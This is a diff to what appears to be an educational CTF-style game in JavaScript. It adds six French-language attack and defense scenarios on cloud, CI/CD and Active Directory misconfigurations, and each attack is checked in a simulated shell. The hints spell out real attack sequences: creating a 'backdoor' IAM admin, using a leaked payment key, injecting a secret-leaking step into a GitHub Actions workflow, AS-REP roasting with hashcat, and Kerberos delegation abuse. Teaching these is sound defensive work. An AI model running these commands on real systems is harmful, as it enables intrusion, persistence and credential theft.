@@ -2572,6 +2572,948 @@ const SCENARIOS = [
     log.push({t:'[+] Image malveillante redéployée automatiquement, shell root obtenu.', cls:'ok'});
     return {log, success:true};
   }
+},
+
+/* ===================== 32. Rôle IAM trop permissif ===================== */
+{
+  id:'iam-role-overpermissive',
+  title:'Un rôle IAM largement trop permissif attaché à une fonction publique',
+  category:'Cloud / identité (rôle IAM trop permissif)',
+  attack:{
+    who:'Vous incarnez bob, un utilisateur externe ayant trouvé un point d\'entrée applicatif exposant les identifiants temporaires du rôle IAM attaché.',
+    desc:"La fonction serverless publique de target-lab tourne avec un rôle IAM censé se limiter à la lecture d'un bucket, mais la politique attachée autorise `*` sur `iam:*`. Utilisez les identifiants du rôle pour créer un nouvel utilisateur IAM avec accès administrateur complet.",
+    hints:[
+      "`aws sts get-caller-identity --profile fn-role` confirme quel rôle est actif : `arn:aws:sts::111122223333:assumed-role/read-only-fn/session`.",
+      "`aws iam simulate-principal-policy --profile fn-role --action-names iam:CreateUser` montre que l'action est autorisée alors qu'elle ne devrait pas l'être pour un rôle de lecture seule.",
+      "`aws iam create-user --user-name backdoor --profile fn-role` crée un compte IAM persistant grâce à la sur-permission.",
+      "`aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile fn-role` attache la politique d'administration complète au compte créé."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur cloud chargé de corriger la faille.',
+    desc:"Réduisez la politique IAM attachée au rôle de la fonction au strict nécessaire (lecture seule du bucket), sans lui laisser aucun droit sur le service IAM lui-même.",
+    hints:[
+      "Éditez `/etc/cloud/iam-role-policy.json` avec `nano` et remplacez l'action `\"iam:*\"` par `\"s3:GetObject\"`, seule action réellement utilisée par la fonction.",
+      "`verify` confirme que la politique ne référence plus aucune action `iam:*`."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['cloud']},
+      '/etc/cloud':{type:'dir',perm:'755',owner:'root',children:['iam-role-policy.json']},
+      '/etc/cloud/iam-role-policy.json':{type:'file',perm:'644',owner:'root',size:150,
+        content:"{\n  \"RoleName\": \"read-only-fn\",\n  \"Statement\": [\n    { \"Effect\": \"Allow\", \"Action\": [\"s3:GetObject\", \"iam:*\"], \"Resource\": \"*\" }\n  ]\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^aws\s+sts\s+get-caller-identity\s+--profile\s+fn-role$/, run(state, print){
+        print('{"Arn": "arn:aws:sts::111122223333:assumed-role/read-only-fn/session"}', 'out');
+      }
+    },
+    { pattern:/^aws\s+iam\s+simulate-principal-policy\s+--profile\s+fn-role\s+--action-names\s+iam:CreateUser$/, run(state, print){
+        const over = /"iam:\*"/.test(state.vfs['/etc/cloud/iam-role-policy.json'].content);
+        print(over ? '{"EvalActionName": "iam:CreateUser", "EvalDecision": "allowed"}' : '{"EvalActionName": "iam:CreateUser", "EvalDecision": "implicitDeny"}', over ? 'out' : 'err');
+      }
+    },
+    { pattern:/^aws\s+iam\s+create-user\s+--user-name\s+backdoor\s+--profile\s+fn-role$/, run(state, print){
+        const over = /"iam:\*"/.test(state.vfs['/etc/cloud/iam-role-policy.json'].content);
+        if(!over){ print('An error occurred (AccessDenied) when calling the CreateUser operation', 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.userCreated = true;
+        print('{"User": {"UserName": "backdoor", "UserId": "AIDABACKDOOR"}}', 'ok');
+      }
+    },
+    { pattern:/^aws\s+iam\s+attach-user-policy\s+--user-name\s+backdoor\s+--policy-arn\s+arn:aws:iam::aws:policy\/AdministratorAccess\s+--profile\s+fn-role$/, run(state, print){
+        const over = /"iam:\*"/.test(state.vfs['/etc/cloud/iam-role-policy.json'].content);
+        if(!over){ print('An error occurred (AccessDenied) when calling the AttachUserPolicy operation', 'err'); return; }
+        if(!state.flags || !state.flags.userCreated){ print('An error occurred (NoSuchEntity): l\'utilisateur backdoor n\'existe pas.', 'err'); return; }
+        state.flags.persisted = true;
+        print("[+] Politique AdministratorAccess attachée au compte backdoor : persistance admin obtenue via un rôle censé être lecture seule.", 'ok');
+        print("FLAG{iam_role_trop_permissif_backdoor_admin}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){ return !/"iam:\*"/.test(state.vfs['/etc/cloud/iam-role-policy.json'].content); },
+  replay(state){
+    const log=[];
+    const over = /"iam:\*"/.test(state.vfs['/etc/cloud/iam-role-policy.json'].content);
+    log.push({t:'$ aws iam create-user --user-name backdoor --profile fn-role', cls:'prompt-line'});
+    if(!over){
+      log.push({t:'An error occurred (AccessDenied) when calling the CreateUser operation', cls:'err'});
+      log.push({t:"[-] Le rôle est désormais limité à la lecture du bucket : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'{"User": {"UserName": "backdoor"}}', cls:'ok'});
+    log.push({t:'$ aws iam attach-user-policy --user-name backdoor --policy-arn .../AdministratorAccess --profile fn-role', cls:'prompt-line'});
+    log.push({t:'[+] Compte administrateur persistant créé via un rôle sur-permissif.', cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 33. Secret applicatif poussé dans un dépôt public ===================== */
+{
+  id:'secret-in-public-repo',
+  title:'Une clé API codée en dur, poussée par erreur dans un dépôt public',
+  category:'Cloud / identité (secret exposé dans un dépôt public)',
+  attack:{
+    who:'Vous incarnez bob, un utilisateur externe anonyme.',
+    desc:"Le dépôt public `payment-service` de target-lab contient une clé API de paiement codée en dur dans le code applicatif, au lieu d'être chargée depuis une variable d'environnement. Clonez le dépôt, retrouvez la clé, puis utilisez-la pour interroger l'API de paiement.",
+    hints:[
+      "`git clone https://github.com/target-lab/payment-service.git` récupère une copie locale du dépôt public.",
+      "`grep -r API_KEY payment-service` retrouve la ligne où la clé est codée en dur dans le code source versionné.",
+      "`curl -H 'Authorization: Bearer pk_live_9f3ac02dprodTARGETLAB' https://api.payments.target-lab/v1/charges` confirme que la clé volée fonctionne encore et donne accès à l'API de paiement en production."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais le développeur chargé de corriger la fuite.',
+    desc:"Révoquez la clé codée en dur dans le dépôt : remplacez-la par une lecture depuis la variable d'environnement `PAYMENT_API_KEY`, pour qu'aucun secret ne reste versionné en clair.",
+    hints:[
+      "Éditez `payment-service/config.js` avec `nano` et remplacez la valeur codée en dur par `process.env.PAYMENT_API_KEY`.",
+      "`verify` confirme qu'aucune clé en clair ne subsiste dans le fichier."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:['payment-service']},
+      '/home/bob/payment-service':{type:'dir',perm:'755',owner:'bob',children:['config.js']},
+      '/home/bob/payment-service/config.js':{type:'file',perm:'644',owner:'bob',size:90,
+        content:"module.exports = {\n  apiKey: 'pk_live_9f3ac02dprodTARGETLAB',\n  endpoint: 'https://api.payments.target-lab/v1'\n};\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^git\s+clone\s+https:\/\/github\.com\/target-lab\/payment-service\.git$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.cloned = true;
+        print("Cloning into 'payment-service'...", 'out');
+        print('[+] Dépôt déjà présent localement dans ./payment-service (mise à jour simulée).', 'ok');
+      }
+    },
+    { pattern:/^grep\s+-r\s+API_KEY\s+payment-service$/, run(state, print){
+        const c = state.vfs['/home/bob/payment-service/config.js'].content;
+        const leaked = /apiKey:\s*'pk_live_9f3ac02dprodTARGETLAB'/.test(c);
+        if(!leaked){ print('grep: aucune correspondance', 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.keyFound = true;
+        print("payment-service/config.js:  apiKey: 'pk_live_9f3ac02dprodTARGETLAB',", 'out');
+      }
+    },
+    { pattern:/^curl\s+-H\s+'Authorization:\s+Bearer\s+pk_live_9f3ac02dprodTARGETLAB'\s+https:\/\/api\.payments\.target-lab\/v1\/charges$/, run(state, print){
+        const c = state.vfs['/home/bob/payment-service/config.js'].content;
+        const leaked = /apiKey:\s*'pk_live_9f3ac02dprodTARGETLAB'/.test(c);
+        if(!leaked){ print('{"error": "invalid_api_key"}', 'err'); return; }
+        if(!state.flags || !state.flags.keyFound){ print("curl: clé API inconnue, retrouvez-la d'abord dans le code.", 'err'); return; }
+        state.flags.charged = true;
+        print('{"charges": [{"id": "ch_88213", "amount": 129900, "customer": "prod-client-771"}]}', 'ok');
+        print("[+] Clé de production active retrouvée dans le code source versionné publiquement.", 'ok');
+        print("FLAG{secret_code_en_dur_depot_public}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.charged === true; },
+  defenseCheck(state){ return !/pk_live_9f3ac02dprodTARGETLAB/.test(state.vfs['/home/bob/payment-service/config.js'].content) && /process\.env\.PAYMENT_API_KEY/.test(state.vfs['/home/bob/payment-service/config.js'].content); },
+  replay(state){
+    const log=[];
+    const leaked = /pk_live_9f3ac02dprodTARGETLAB/.test(state.vfs['/home/bob/payment-service/config.js'].content);
+    log.push({t:'$ grep -r API_KEY payment-service', cls:'prompt-line'});
+    if(!leaked){
+      log.push({t:'grep: aucune correspondance', cls:'err'});
+      log.push({t:"[-] La clé n'est plus codée en dur : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:"payment-service/config.js:  apiKey: 'pk_live_9f3ac02dprodTARGETLAB',", cls:'ok'});
+    log.push({t:'[+] Clé de production extraite du dépôt public, API de paiement interrogée.', cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 34. Jeton OAuth à portée trop large ===================== */
+{
+  id:'oauth-token-overscope',
+  title:'Un jeton OAuth intégré avec une portée bien plus large que nécessaire',
+  category:'Cloud / identité (jeton OAuth à portée trop large)',
+  attack:{
+    who:'Vous incarnez bob, un utilisateur externe ayant intercepté un jeton OAuth destiné à une intégration de lecture de profil.',
+    desc:"L'application tierce ne devait obtenir qu'une portée `profile:read`, mais le jeton délivré porte en réalité la portée `repo:admin`. Utilisez-le pour aller bien au-delà de son usage prévu : supprimez un dépôt du compte cible.",
+    hints:[
+      "`curl -H 'Authorization: Bearer oauth_tkn_5f2c_scope_all' https://api.git.target-lab/oauth/scopes` révèle la portée réelle du jeton intercepté.",
+      "`curl -H 'Authorization: Bearer oauth_tkn_5f2c_scope_all' https://api.git.target-lab/user/repos` liste les dépôts accessibles bien au-delà d'un simple profil en lecture.",
+      "`curl -X DELETE -H 'Authorization: Bearer oauth_tkn_5f2c_scope_all' https://api.git.target-lab/repos/target-lab/prod-core` supprime un dépôt de production grâce à la portée `repo:admin` jamais censée être accordée."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur de la plateforme OAuth chargé de corriger la faille.',
+    desc:"Restreignez la portée déclarée de l'application tierce à `profile:read` uniquement, conformément à son usage réel.",
+    hints:[
+      "Éditez `/etc/oauth/app-registration.json` avec `nano` et remplacez `\"scope\": \"repo:admin\"` par `\"scope\": \"profile:read\"`.",
+      "`verify` confirme que la portée déclarée ne dépasse plus ce qui est nécessaire."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['oauth']},
+      '/etc/oauth':{type:'dir',perm:'755',owner:'root',children:['app-registration.json']},
+      '/etc/oauth/app-registration.json':{type:'file',perm:'644',owner:'root',size:110,
+        content:"{\n  \"client_id\": \"profile-widget\",\n  \"intended_use\": \"lecture de profil utilisateur\",\n  \"scope\": \"repo:admin\"\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^curl\s+-H\s+'Authorization:\s+Bearer\s+oauth_tkn_5f2c_scope_all'\s+https:\/\/api\.git\.target-lab\/oauth\/scopes$/, run(state, print){
+        const over = /"scope":\s*"repo:admin"/.test(state.vfs['/etc/oauth/app-registration.json'].content);
+        print(over ? '{"scope": "repo:admin", "client_id": "profile-widget"}' : '{"scope": "profile:read", "client_id": "profile-widget"}', 'out');
+      }
+    },
+    { pattern:/^curl\s+-H\s+'Authorization:\s+Bearer\s+oauth_tkn_5f2c_scope_all'\s+https:\/\/api\.git\.target-lab\/user\/repos$/, run(state, print){
+        const over = /"scope":\s*"repo:admin"/.test(state.vfs['/etc/oauth/app-registration.json'].content);
+        if(!over){ print('{"error": "insufficient_scope"}', 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.listed = true;
+        print('[{"name": "prod-core", "private": true}, {"name": "internal-docs", "private": true}]', 'out');
+      }
+    },
+    { pattern:/^curl\s+-X\s+DELETE\s+-H\s+'Authorization:\s+Bearer\s+oauth_tkn_5f2c_scope_all'\s+https:\/\/api\.git\.target-lab\/repos\/target-lab\/prod-core$/, run(state, print){
+        const over = /"scope":\s*"repo:admin"/.test(state.vfs['/etc/oauth/app-registration.json'].content);
+        if(!over){ print('{"error": "insufficient_scope"}', 'err'); return; }
+        if(!state.flags || !state.flags.listed){ print("curl: dépôt inconnu, listez d'abord les dépôts accessibles.", 'err'); return; }
+        state.flags.deleted = true;
+        print('204 No Content', 'ok');
+        print("[+] Dépôt de production supprimé via un jeton censé être limité à la lecture de profil.", 'ok');
+        print("FLAG{oauth_scope_trop_large_suppression_depot}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.deleted === true; },
+  defenseCheck(state){ return /"scope":\s*"profile:read"/.test(state.vfs['/etc/oauth/app-registration.json'].content); },
+  replay(state){
+    const log=[];
+    const over = /"scope":\s*"repo:admin"/.test(state.vfs['/etc/oauth/app-registration.json'].content);
+    log.push({t:"$ curl -X DELETE ... https://api.git.target-lab/repos/target-lab/prod-core", cls:'prompt-line'});
+    if(!over){
+      log.push({t:'{"error": "insufficient_scope"}', cls:'err'});
+      log.push({t:"[-] La portée du jeton est désormais limitée à profile:read : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'204 No Content', cls:'ok'});
+    log.push({t:'[+] Dépôt de production supprimé via une portée OAuth abusive.', cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 35. Secret GitHub Actions exfiltré via un workflow détourné ===================== */
+{
+  id:'github-actions-secret-leak',
+  title:'Un secret de dépôt exfiltré via un workflow GitHub Actions détourné',
+  category:'Cloud / identité (secret CI/CD exfiltré via GitHub Actions)',
+  attack:{
+    who:'Vous incarnez bob, un contributeur externe ayant proposé une pull request sur le dépôt public de target-lab.',
+    desc:"Le workflow `.github/workflows/build.yml` se déclenche sur `pull_request_target` et exécute directement le code de la pull request, avec accès aux secrets du dépôt : une combinaison dangereuse. Modifiez le workflow pour faire fuiter le secret `DEPLOY_TOKEN` dans les logs de build.",
+    hints:[
+      "`cat .github/workflows/build.yml` confirme le déclencheur `pull_request_target` combiné à un accès aux secrets — le code de la pull request tourne avec les secrets du dépôt cible.",
+      "Éditez `.github/workflows/build.yml` avec `nano` et ajoutez une étape `run: echo $DEPLOY_TOKEN` dans le job de build : c'est la charge utile de la pull request malveillante.",
+      "`gh workflow run build.yml` déclenche l'exécution du workflow modifié, avec les secrets du dépôt cible.",
+      "`gh run view --log` consulte les logs de build et révèle le secret `DEPLOY_TOKEN` en clair, imprimé par l'étape ajoutée."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais le mainteneur du dépôt chargé de corriger la faille.',
+    desc:"Remplacez le déclencheur dangereux par `pull_request` (qui n'expose pas les secrets au code externe) pour ce workflow de build.",
+    hints:[
+      "Éditez `.github/workflows/build.yml` avec `nano` et remplacez `pull_request_target` par `pull_request`.",
+      "`verify` confirme que le déclencheur dangereux n'est plus utilisé."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:['.github']},
+      '/home/bob/.github':{type:'dir',perm:'755',owner:'bob',children:['workflows']},
+      '/home/bob/.github/workflows':{type:'dir',perm:'755',owner:'bob',children:['build.yml']},
+      '/home/bob/.github/workflows/build.yml':{type:'file',perm:'644',owner:'bob',size:130,
+        content:"on:\n  pull_request_target:\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm run build\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob/.github/workflows',
+  exploitRules:[
+    { pattern:/^cat\s+\.github\/workflows\/build\.yml$/, run(state, print){
+        print(state.vfs['/home/bob/.github/workflows/build.yml'].content, 'out');
+      }
+    },
+    { pattern:/^gh\s+workflow\s+run\s+build\.yml$/, run(state, print){
+        const c = state.vfs['/home/bob/.github/workflows/build.yml'].content;
+        const dangerous = /pull_request_target/.test(c);
+        const payload = /echo\s+\$DEPLOY_TOKEN/.test(c);
+        if(!dangerous){ print("Error: ce workflow ne se déclenche plus sur le code des pull requests externes.", 'err'); return; }
+        if(!payload){ print("gh: le workflow a bien été lancé, mais aucune charge utile n'imprime le secret — modifiez d'abord build.yml.", 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.triggered = true;
+        print('✓ Run started (run id: 918234012)', 'ok');
+      }
+    },
+    { pattern:/^gh\s+run\s+view\s+--log$/, run(state, print){
+        if(!state.flags || !state.flags.triggered){ print("gh: aucun run récent, déclenchez d'abord le workflow.", 'err'); return; }
+        state.flags.leaked = true;
+        print('build\tnpm run build', 'out');
+        print('build\tghs_deployToken_Pr0dCICD9911', 'out');
+        print("[+] Secret DEPLOY_TOKEN imprimé en clair dans les logs par le workflow détourné.", 'ok');
+        print("FLAG{github_actions_pull_request_target_secret_leak}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.leaked === true; },
+  defenseCheck(state){ return !/pull_request_target/.test(state.vfs['/home/bob/.github/workflows/build.yml'].content) && /pull_request:/.test(state.vfs['/home/bob/.github/workflows/build.yml'].content); },
+  replay(state){
+    const log=[];
+    const c = state.vfs['/home/bob/.github/workflows/build.yml'].content;
+    const dangerous = /pull_request_target/.test(c);
+    log.push({t:'$ gh workflow run build.yml', cls:'prompt-line'});
+    if(!dangerous){
+      log.push({t:"Error: ce workflow ne se déclenche plus sur le code des pull requests externes.", cls:'err'});
+      log.push({t:"[-] Le déclencheur pull_request_target a été remplacé : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'✓ Run started (run id: 918234012)', cls:'ok'});
+    log.push({t:'$ gh run view --log', cls:'prompt-line'});
+    log.push({t:'build\tghs_deployToken_Pr0dCICD9911', cls:'ok'});
+    log.push({t:'[+] Secret DEPLOY_TOKEN exfiltré via le workflow détourné.', cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 36. AS-REP Roasting (Active Directory) ===================== */
+{
+  id:'ad-asrep-roasting',
+  title:'Un compte sans pré-authentification Kerberos requise (AS-REP Roasting)',
+  category:'Active Directory (AS-REP Roasting)',
+  attack:{
+    who:'Vous incarnez bob, un utilisateur du domaine sans privilège particulier, avec un simple accès réseau au contrôleur de domaine.',
+    desc:"Le compte de service `svc-backup` a l'attribut « ne nécessite pas de pré-authentification Kerberos » activé par erreur. N'importe quel utilisateur du domaine peut donc demander un ticket Kerberos pour ce compte sans jamais prouver qu'il en connaît le mot de passe, et récupérer un answer chiffré avec le hash du mot de passe du compte — à casser hors-ligne.",
+    hints:[
+      "`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` (interrogation LDAP du domaine) liste les comptes vulnérables : `svc-backup` ressort.",
+      "`asrep-roast svc-backup` simule la demande de ticket AS-REP pour ce compte précis, sans authentification préalable, et récupère le hash chiffré associé.",
+      "`hashcat --mode 18200 svc-backup.asrep rockyou.txt` casse ce hash hors-ligne et révèle le mot de passe en clair du compte de service.",
+      "`net use \\\\dc01\\C$ /user:svc-backup <mot_de_passe_trouvé>` confirme que le mot de passe cassé donne un accès administrateur sur le contrôleur de domaine (le compte de service y est administrateur local)."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
+    desc:"Réactivez l'exigence de pré-authentification Kerberos sur le compte `svc-backup`, pour qu'un ticket AS-REP ne puisse plus être demandé sans prouver la connaissance du mot de passe au préalable.",
+    hints:[
+      "Éditez `/etc/ad/users/svc-backup.json` avec `nano` et remplacez `\"doesNotRequirePreAuth\": true` par `\"doesNotRequirePreAuth\": false`.",
+      "`verify` confirme que le compte exige de nouveau la pré-authentification."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
+      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['users']},
+      '/etc/ad/users':{type:'dir',perm:'755',owner:'root',children:['svc-backup.json']},
+      '/etc/ad/users/svc-backup.json':{type:'file',perm:'644',owner:'root',size:120,
+        content:"{\n  \"sAMAccountName\": \"svc-backup\",\n  \"memberOf\": \"Administrateurs locaux (dc01)\",\n  \"doesNotRequirePreAuth\": true\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^Get-ADUser\s+-Filter\s+\{DoesNotRequirePreAuth\s+-eq\s+\$true\}$/, run(state, print){
+        const vuln = /"doesNotRequirePreAuth":\s*true/.test(state.vfs['/etc/ad/users/svc-backup.json'].content);
+        if(vuln){ print('sAMAccountName : svc-backup', 'out'); print('DoesNotRequirePreAuth : True', 'out'); }
+        else { print('Aucun compte trouvé.', 'out'); }
+      }
+    },
+    { pattern:/^asrep-roast\s+svc-backup$/, run(state, print){
+        const vuln = /"doesNotRequirePreAuth":\s*true/.test(state.vfs['/etc/ad/users/svc-backup.json'].content);
+        if(!vuln){ print('[Kerberos] KRB5KDC_ERR_PREAUTH_REQUIRED — pré-authentification requise.', 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.hashDumped = true;
+        print('[+] Ticket AS-REP obtenu pour svc-backup, sans authentification préalable.', 'ok');
+        print('$krb5asrep$23$svc-backup@LAB.LOCAL:8f2c1a...(hash tronqué)', 'out');
+        print('[+] Hash sauvegardé dans svc-backup.asrep', 'ok');
+      }
+    },
+    { pattern:/^hashcat\s+--mode\s+18200\s+svc-backup\.asrep\s+rockyou\.txt$/, run(state, print){
+        if(!state.flags || !state.flags.hashDumped){ print('hashcat: fichier svc-backup.asrep introuvable — récupérez d\'abord le hash.', 'err'); return; }
+        state.flags.cracked = true;
+        print('$krb5asrep$23$svc-backup@LAB.LOCAL:8f2c1a...:Sauvegarde2023!', 'ok');
+        print('[+] Mot de passe cassé : Sauvegarde2023!', 'ok');
+      }
+    },
+    { pattern:/^net\s+use\s+\\\\dc01\\C\$\s+\/user:svc-backup\s+Sauvegarde2023!$/, run(state, print){
+        if(!state.flags || !state.flags.cracked){ print('net use : mot de passe incorrect ou inconnu.', 'err'); return; }
+        state.flags.persisted = true;
+        print('La commande s\'est terminée correctement.', 'ok');
+        print('[+] Accès administrateur local sur dc01 obtenu via le compte svc-backup.', 'ok');
+        print("FLAG{asrep_roasting_svc_backup_admin_dc}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){ return /"doesNotRequirePreAuth":\s*false/.test(state.vfs['/etc/ad/users/svc-backup.json'].content); },
+  replay(state){
+    const log=[];
+    const vuln = /"doesNotRequirePreAuth":\s*true/.test(state.vfs['/etc/ad/users/svc-backup.json'].content);
+    log.push({t:'$ asrep-roast svc-backup', cls:'prompt-line'});
+    if(!vuln){
+      log.push({t:'[Kerberos] KRB5KDC_ERR_PREAUTH_REQUIRED — pré-authentification requise.', cls:'err'});
+      log.push({t:"[-] La pré-authentification est désormais exigée : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'[+] Ticket AS-REP obtenu pour svc-backup, sans authentification préalable.', cls:'ok'});
+    log.push({t:'[+] Hash cassable hors-ligne récupéré, accès administrateur sur dc01 obtenu.', cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 37. Délégation Kerberos sans contrainte (Active Directory) ===================== */
+{
+  id:'ad-unconstrained-delegation',
+  title:'Un compte machine en délégation Kerberos sans contrainte',
+  category:'Active Directory (délégation sans contrainte)',
+  attack:{
+    who:'Vous incarnez bob, qui vient d\'obtenir un accès administrateur local sur le serveur `print01`, un serveur d\'impression du domaine.',
+    desc:"Le compte machine `PRINT01$` est configuré en délégation Kerberos « sans contrainte », ce qui signifie que tout ticket Kerberos d'un utilisateur qui s'y connecte est mis en cache localement, réutilisable tel quel. Provoquez la connexion d'un administrateur du domaine sur ce serveur, puis réutilisez son ticket mis en cache pour usurper son identité.",
+    hints:[
+      "`cat /etc/ad/computers/print01.json` confirme que `PRINT01$` a l'attribut `unconstrainedDelegation` activé.",
+      "`printbug dc01 print01` simule l'abus du service Print Spooler pour forcer le contrôleur de domaine (donc un compte administrateur) à s'authentifier sur `print01`.",
+      "`klist` liste les tickets Kerberos désormais mis en cache sur `print01`, y compris celui de l'administrateur du domaine qui vient de se connecter.",
+      "`inject-ticket DC01$@LAB.LOCAL` réutilise ce ticket mis en cache pour usurper l'identité du contrôleur de domaine et obtenir un accès complet au domaine."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
+    desc:"Désactivez la délégation sans contrainte sur le compte machine `PRINT01$` — un serveur d'impression n'a aucune raison de pouvoir rejouer les tickets Kerberos des utilisateurs qui s'y connectent.",
+    hints:[
+      "Éditez `/etc/ad/computers/print01.json` avec `nano` et remplacez `\"unconstrainedDelegation\": true` par `\"unconstrainedDelegation\": false`.",
+      "`verify` confirme que la délégation sans contrainte est désactivée."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
+      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['computers']},
+      '/etc/ad/computers':{type:'dir',perm:'755',owner:'root',children:['print01.json']},
+      '/etc/ad/computers/print01.json':{type:'file',perm:'644',owner:'root',size:110,
+        content:"{\n  \"sAMAccountName\": \"PRINT01$\",\n  \"role\": \"serveur d'impression\",\n  \"unconstrainedDelegation\": true\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^printbug\s+dc01\s+print01$/, run(state, print){
+        const vuln = /"unconstrainedDelegation":\s*true/.test(state.vfs['/etc/ad/computers/print01.json'].content);
+        if(!vuln){ print('[spooler] print01 ne met plus les tickets en cache — abus sans effet.', 'err'); return; }
+        state.flags = state.flags || {};
+        state.flags.coerced = true;
+        print('[spooler] dc01 authentifié de force sur print01 (abus du service Print Spooler).', 'ok');
+        print('[+] Ticket Kerberos de DC01$ mis en cache sur print01.', 'ok');
+      }
+    },
+    { pattern:/^klist$/, run(state, print){
+        if(!state.flags || !state.flags.coerced){ print('Cache de tickets actuel :\n  (aucun ticket administrateur)', 'out'); return; }
+        state.flags.listed = true;
+        print('Cache de tickets actuel :', 'out');
+        print('  Client: DC01$ @ LAB.LOCAL   Serveur: krbtgt/LAB.LOCAL', 'out');
+      }
+    },
+    { pattern:/^inject-ticket\s+DC01\$@LAB\.LOCAL$/, run(state, print){
+        const vuln = /"unconstrainedDelegation":\s*true/.test(state.vfs['/etc/ad/computers/print01.json'].content);
+        if(!vuln){ print('inject-ticket : aucun ticket mis en cache à réutiliser.', 'err'); return; }
+        if(!state.flags || !state.flags.listed){ print('inject-ticket : listez d\'abord le cache avec klist.', 'err'); return; }
+        state.flags.persisted = true;
+        print('[+] Identité DC01$ (contrôleur de domaine) usurpée avec succès.', 'ok');
+        print("FLAG{delegation_sans_contrainte_usurpation_dc}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){ return /"unconstrainedDelegation":\s*false/.test(state.vfs['/etc/ad/computers/print01.json'].content); },
+  replay(state){
+    const log=[];
+    const vuln = /"unconstrainedDelegation":\s*true/.test(state.vfs['/etc/ad/computers/print01.json'].content);
+    log.push({t:'$ printbug dc01 print01', cls:'prompt-line'});
+    if(!vuln){
+      log.push({t:'[spooler] print01 ne met plus les tickets en cache — abus sans effet.', cls:'err'});
+      log.push({t:"[-] La délégation sans contrainte est désactivée : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'[+] Ticket Kerberos de DC01$ mis en cache sur print01.', cls:'ok'});
+    log.push({t:'[+] Identité du contrôleur de domaine usurpée via le ticket mis en cache.', cls:'ok'});
+    return {log, success:true};
+  }
+},
+
